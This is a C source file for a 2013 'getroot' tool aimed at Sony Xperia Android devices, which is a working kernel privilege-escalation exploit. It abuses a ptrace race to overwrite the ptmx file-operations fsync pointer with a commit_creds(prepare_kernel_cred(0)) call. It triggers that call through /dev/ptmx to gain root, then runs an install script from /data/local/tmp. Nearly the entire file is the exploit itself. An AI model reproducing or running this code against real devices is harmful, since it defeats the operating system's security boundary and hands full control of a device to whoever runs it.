/* getroot for xperia devices */

/*
 * Copyright (C) 2013 CUBE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define EXECCOMMAND "/data/local/tmp/install_tool.sh"
#define PTMX_DEVICE "/dev/ptmx"

#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

unsigned long int PREPARE_KERNEL_CRED_ADDRESS = 0;
unsigned long int COMMIT_CREDS_ADDRESS = 0;
unsigned long int PTMX_FOPS_ADDRESS = 0;

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *);
int (*commit_creds)(struct cred *);

bool bChiled;

void obtain_root_privilege(void) {
	commit_creds(prepare_kernel_cred(0));
}

static bool run_obtain_root_privilege(void *user_data) {
	int fd;

	fd = open(PTMX_DEVICE, O_WRONLY);
	fsync(fd);
	close(fd);

	return true;
}

void ptrace_write_value_at_address(unsigned long int address, void *value) {
	pid_t pid;
	long ret;
	int status;

	bChiled = false;
	pid = fork();
	if (pid < 0) {
		return;
	}
	if (pid == 0) {
		ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
		if (ret < 0) {
			fprintf(stderr, "PTRACE_TRACEME failed\n");
		}
		bChiled = true;
		signal(SIGSTOP, SIG_IGN);
		kill(getpid(), SIGSTOP);
		exit(EXIT_SUCCESS);
	}

	do {
		ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
	} while (!bChiled);

	ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &value, (void *)address);
	if (ret < 0) {
		fprintf(stderr, "PTRACE_PEEKDATA failed: %s\n", strerror(errno));
	}

	kill(pid, SIGKILL);
	waitpid(pid, &status, WNOHANG);
}

bool ptrace_run_exploit(unsigned long int address, void *value, bool (*exploit_callback)(void *user_data), void *user_data) {
	bool success;

	ptrace_write_value_at_address(address, value);
	success = exploit_callback(user_data);

	return success;
}

static bool run_exploit(void) {
	unsigned long int ptmx_fops_address;
	unsigned long int ptmx_fsync_address;

	ptmx_fops_address = PTMX_FOPS_ADDRESS;
	ptmx_fsync_address = ptmx_fops_address + 0x38;
	return ptrace_run_exploit(ptmx_fsync_address, &obtain_root_privilege, run_obtain_root_privilege, NULL);
}

char *getprop(const char *prop) {
	FILE *fp;
  	int status;
  	char path[1035];
  	char command[255];
  	char *result=NULL;

  	/* Open the command for reading. */
  	strcpy(command,"/system/bin/getprop ");
  	strcat(command,prop);
  	fp = popen(command, "r");
  	if (fp == NULL) {
    	printf("Failed to run command\n" );
  	}

  	/* Read the output a line at a time - output it. */
  	while (fgets(path, sizeof(path)-1, fp) != NULL) {
  	}
	
	result = malloc(sizeof (*result) * (strlen (path) + 1));
	strncpy(result,path,strlen(path)-1);
	
  	/* close */
  	pclose(fp);
  	return result;

}

void feed_addresses(char *filename) {
	printf("Reading addresses from file %s\n",filename);
	FILE *file = fopen ( filename, "r" );
	if ( file != NULL ) {
		char line [128];
		int i=0;
	    while ( fgets ( line, sizeof line, file ) != NULL ) {
	    	line[strlen(line)-1]=0;
			
	    	if (i==0) {
	    		sscanf(line, "%x", &PREPARE_KERNEL_CRED_ADDRESS);
	    		printf("prepare_kernel_cred_address : %s (int value : %lu)\n",line,PREPARE_KERNEL_CRED_ADDRESS);
	    	}
	    	if (i==1) {
	    		sscanf(line, "%x", &COMMIT_CREDS_ADDRESS);
	    		printf("commit_creds_address : %s (int value : %lu)\n",line,COMMIT_CREDS_ADDRESS);
	    	}
	    	if (i==2) {
	    		sscanf(line, "%x", &PTMX_FOPS_ADDRESS);
	    		printf("ptmx_fops_address : %s (int value : %lu)\n",line,PTMX_FOPS_ADDRESS);
	    	}
	    	i++;
	    }
	    fclose ( file );
	}
	else {
		perror ( filename );
		fprintf( stderr, "Device not supported\n");
		exit(EXIT_FAILURE);
	}
}

int main(int argc, char **argv) {
	
	char *build = getprop("ro.build.id");
	char *device = getprop("ro.product.device");
	char filename[255];
	strcpy(filename,"/data/local/tmp/");
	strcat(filename,device);
	strcat(filename,"_");
	strcat(filename,build);
	feed_addresses(filename);	
	
	pid_t pid;

	prepare_kernel_cred = (void *)PREPARE_KERNEL_CRED_ADDRESS;
	commit_creds = (void *)COMMIT_CREDS_ADDRESS;

	printf("Wait a minutes...\n");
	run_exploit();

	if (getuid() != 0) {
		printf("Failed to getroot.\n");
		exit(EXIT_FAILURE);
	}

	printf("Succeeded in getroot!\n");
	if (argc >= 2) {
		system(argv[0]);
	} else {
		int result = system(EXECCOMMAND);
		if (result != 0) {
			fprintf(stderr, "Error installing root files\n");
			exit(EXIT_FAILURE);
		}
	}

	exit(EXIT_SUCCESS);
	return 0;
}
